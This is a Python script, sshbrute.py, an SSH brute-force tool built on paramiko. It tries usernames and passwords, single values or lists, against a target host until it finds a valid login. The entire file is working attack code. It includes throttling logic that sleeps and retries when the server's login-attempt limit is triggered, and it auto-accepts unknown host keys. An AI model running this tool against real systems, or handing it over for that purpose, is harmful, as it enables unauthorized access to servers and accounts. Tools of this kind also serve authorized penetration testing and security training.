#!/usr/bin/python3
#Title: sshbrute.py
#Author: ApexPredator
#License: MIT
#Github: https://github.com/ApexPredator-InfoSec/SSH-Bruteforce
#Description: This script takes an IP or hostname and attempts a brute force of username and password from a supplied individual or list of usernames or passwords
import argparse
import paramiko
import socket
import time
import sys
from colorama import init, Fore

parser = argparse.ArgumentParser(prog='sshbrute.py', usage='python3 -t <target> -u <username> -p <password>\npython3 sshbrute.py -t 127.0.0.1 -u test -p testpass') #build argument list
parser.add_argument('-t', '--target', help='Target IP', required=True)
parser.add_argument('-u', '--username', help='Username to bruteforce', required=False)
parser.add_argument('-ul', '--usernamelist', help='list of usernames to bruteforce', required=False)
parser.add_argument('-p', '--password', help='password to bruteforce', required=False)
parser.add_argument('-pl', '--passwordlist', help='list of passwords to bruteforce', required=False)
parser.add_argument('-lc', '--logincount', help='Number of logins to try before sleeping', type=int, required=False, default=10000)
parser.add_argument('-st', '--sleeptime', help='Time to sleep after login count threshold is hit', required=False, type=int, default=5)
parser.add_argument('-to', '--timeout', help='password to bruteforce', required=False, type=int, default=1)
args = parser.parse_args()

def ssh_brute(target, username, password, timeout, ssh_client, GREEN, RESET, sleeptime):
    sys.tracebacklimit=0 #hide the traceback calls when exception is hit to cleanup output

    try:
        ssh_client.connect(hostname=target, username=username, password=password, timeout=timeout) #attempt SSH connection

    except socket.timeout: #test for connection time out
        print("[-]Connection timeout for %s" %target)
        return False #return false on conenction timeout

    except paramiko.AuthenticationException: #test for failed login
        print("[-]Failled login Username: %s Password: %s" %(username, password)) #print failed login
        return False #return false on failed login

    except paramiko.SSHException: #check for SSHException, potential invalid login attempt limit exceeded
        print("[+]Login attempt limit exceeded sleeping for %d seconds..." %sleeptime)
        time.sleep(sleeptime) #sleep if exception recieved
        return ssh_brute(target, username, password, timeout, ssh_client, GREEN, RESET, sleeptime) #rerun after sleep time
    else:
        print(f"{GREEN}[+]Login Successful on %s with username: %s Password: %s{RESET}" %(target,username, password) ) #print sucessful login
        return True #return true on successful login

def main():
    try:
        target = args.target #set target to target passed via command line argument

    except IndexError:
        print("[-] Usage: %s -t <target> -u <username> -p <password>" % sys.argv[0])
        sys.exit() #exit if target isn't set
    count = 0
    sleeptime = args.sleeptime #set time to sleep after logincount threshold hit or SSHException return
    logincount = args.logincount #set logincount threshold
    timeout = args.timeout #set time limit for connection timeout
    if args.username: #single username
        username = args.username
        if args.password: #single password

            password = args.password #set password to the single password passed via command line argument
            init() #initialize colorama to highlight successful login green
            GREEN = Fore.GREEN #set green color
            RESET = Fore.RESET #set reset
            print("[+]Initializing SSH client....")
            ssh_client = paramiko.SSHClient() #initialize the ssh client
            print("[+]Settting auto add known hosts policy...")
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())#prevent the missing host key error
            ssh_brute(target, username, password, timeout, ssh_client, GREEN, RESET, sleeptime) #bruteforce the login

        if args.passwordlist: #multiple passwords
            pfile = args.passwordlist #set pfile to file contianing password list passed with -pl argument
            init() #initialize colorama to highlight successful login green
            GREEN = Fore.GREEN #set green color
            RESET = Fore.RESET #set reset
            print("[+]Initializing SSH client....")
            ssh_client = paramiko.SSHClient() #initialize the ssh client
            print("[+]Settting auto add known hosts policy...")
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #prevent the missing host key error
            with open(pfile, 'r') as password_list: #open the file for reading
                for line in password_list.readlines(): #read each line
                    password = line.strip() #set password to current line in password list file
                    if (count == logincount): #test for logincount threshold
                        print("[+]Logincount threshold hit. Sleeping for %d seconds...." %sleeptime)
                        time.sleep(sleeptime) #sleep specified number of seconds if hit
                        count = 0 #reset the counter
                    count = count + 1 # increment the counter
                    if ssh_brute(target, username, password, timeout, ssh_client, GREEN, RESET, sleeptime): #bruteforce the login
                        break #break if successful login

    if args.usernamelist: #multiple usernames
        ufile = args.usernamelist #set ufile to file contianing username list passed with -pl argument
        init() #initialize colorama to highlight successful login green
        GREEN = Fore.GREEN #set green color
        RESET = Fore.RESET #set reset
        print("[+]Initializing SSH client....")
        ssh_client = paramiko.SSHClient()#initialize the ssh client
        print("[+]Settting auto add known hosts policy...")
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #prevent the missing host key error
        with open(ufile, 'r') as username_list:
            for line in username_list.readlines():
                username = line.strip()
                if args.password: #bruteforce single password for multiple usernames
                    password = args.password
                    if (count == logincount):
                        print("[+]Logincount threshold hit. Sleeping for %d seconds...." %sleeptime)
                        time.sleep(sleeptime) #sleep specified number of seconds if hit
                        count = 0 #reset the counter
                    count = count + 1 # increment the counter
                    ssh_brute(target, username, password, timeout, ssh_client, GREEN, RESET, sleeptime)#bruteforce the login
                if args.passwordlist: #bruteforce multiple passwords for multiple usernames
                    pfile = args.passwordlist #set pfile to file contianing password list passed with -pl argument
                    with open(pfile, 'r') as password_list: #open the file for reading
                        for line in password_list.readlines(): #read each line
                            password = line.strip() #set password to current line in password list file
                            if (count == logincount): #test for logincount threshold
                                print("[+]Logincount threshold hit. Sleeping for %d seconds...." %sleeptime)
                                time.sleep(sleeptime) #sleep specified number of seconds if hit
                                count = 0 #reset the counter
                            count = count + 1 # increment the counter
                            if ssh_brute(target, username, password, timeout, ssh_client, GREEN, RESET, sleeptime): #bruteforce the login
                                break #break if successful login

if __name__ == '__main__':

    main()
